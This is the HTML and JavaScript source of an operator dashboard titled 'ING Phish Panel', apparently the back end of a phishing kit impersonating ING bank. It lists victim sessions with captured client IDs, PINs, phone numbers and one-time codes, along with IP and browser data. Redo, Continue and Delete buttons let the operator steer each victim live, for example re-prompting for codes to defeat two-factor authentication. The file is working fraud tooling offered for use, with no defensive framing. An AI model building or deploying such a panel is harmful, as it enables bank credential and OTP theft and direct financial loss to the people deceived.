<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Control Panel</title>
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <style>
    body{font-family:Arial,Helvetica,sans-serif;background:#111;color:#eee;margin:0;padding:24px}
    h1{margin:0 0 12px;font-size:22px}
    table{width:100%;border-collapse:collapse;font-size:13px}
    th,td{padding:6px 8px;text-align:left;border-bottom:1px solid #333}
    th{background:#222;position:sticky;top:0}
    tr:hover{background:#1a1a1a}
    button{margin:0 2px;padding:4px 8px;font-size:12px;border:none;border-radius:3px;cursor:pointer}
    .btn-red{background:#c00}.btn-green{background:#080}.btn-orange{background:#f60}
    .center{text-align:center}
    .small{font-size:11px;color:#aaa}
    #greeting{position:absolute;top:12px;left:12px;font-size:14px}
    #stats{margin-bottom:12px;font-size:14px}
    #logContainer{max-height:200px;overflow-y:auto;margin-top:12px;background:#0d0d0d;padding:8px;border-radius:4px;font-size:11px;color:#ccc}
  </style>
  <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
</head>
<body>
  <div id="greeting"></div>
  <h1 class="center">ING Phish Panel</h1>
  <div id="stats" class="center"></div>

  <table id="sessionTable">
    <thead>
      <tr>
        <th>#</th><th>Status</th><th>Client</th><th>PIN</th><th>Phone</th><th>OTP</th>
        <th>IP</th><th>Platform</th><th>Browser</th><th>Time (local)</th><th>Action</th>
      </tr>
    </thead>
    <tbody></tbody>
  </table>

  <div id="logContainer"><div id="logs"></div></div>

  <script>
    const socket = io();
    const userName = new URLSearchParams(location.search).get('user') || 'Admin';
    const greetingEl = document.getElementById('greeting');

    function updateClock() {
      const now = new Date();
      const ampm = now.getHours() >= 12 ? 'pm' : 'am';
      const h = now.getHours() % 12 || 12;
      const m = now.getMinutes().toString().padStart(2,'0');
      greetingEl.textContent = `Hello, ${userName} • ${h}:${m}${ampm}`;
    }
    updateClock();
    setInterval(updateClock, 1000);

    /* ----------  polling & render  ---------- */
    let panelData = {};
    async function fetchPanel() {
      const res = await fetch('/api/panel');
      panelData = await res.json();
      render();
    }
    function render() {
      const tbody = document.querySelector('#sessionTable tbody');
      tbody.innerHTML = '';
      for (const s of panelData.sessions) {
        const tr = document.createElement('tr');
        tr.dataset.sid = s.sid;
        const localTime = new Date(s.dateStr).toLocaleString();
        tr.innerHTML = `
          <td>${s.victimNum}</td>
          <td>${s.header}</td>
          <td class="small">${s.email||'-'}</td>
          <td class="small">${s.password||'-'}</td>
          <td class="small">${s.phone||'-'}</td>
          <td class="small">${s.otp||'-'}</td>
          <td class="small">${s.ip}</td>
          <td class="small">${s.platform}</td>
          <td class="small">${s.browser}</td>
          <td class="small">${localTime}</td>
          <td>
            <button class="btn-orange" onclick="send('redo','${s.sid}')">Redo</button>
            <button class="btn-green" onclick="send('cont','${s.sid}')">Cont</button>
            <button class="btn-red" onclick="send('delete','${s.sid}')">Del</button>
          </td>`;
        tbody.appendChild(tr);
      }
      document.getElementById('stats').innerHTML =
        `Domain: <b>${panelData.domain}</b> • ` +
        `Visits: <b>${panelData.visits}</b> • ` +
        `Active: <b>${panelData.active}</b> • ` +
        `Waiting: <b>${panelData.waiting}</b> • ` +
        `Success: <b>${panelData.success}</b>`;
      const logHtml = panelData.logs.map(l =>
        `<div>${new Date(l.t).toLocaleTimeString()} – #${l.victimN} – ${l.email||l.phone||l.otp}</div>`
      ).join('');
      document.getElementById('logs').innerHTML = logHtml;
    }
    async function send(action, sid) {
      await fetch('/api/panel', { method:'POST', headers:{'content-type':'application/json'}, body:JSON.stringify({action,sid})});
      fetchPanel();
    }
    /* ----------  live updates  ---------- */
    socket.on('del', sid => {
      document.querySelector(`tr[data-sid="${sid}"]`)?.remove();
      fetchPanel(); // refresh counters
    });
    socket.on('new', () => fetchPanel() );
    /* ----------  kick-off  ---------- */
    fetchPanel();
    setInterval(fetchPanel, 2000);
  </script>
</body>
</html>
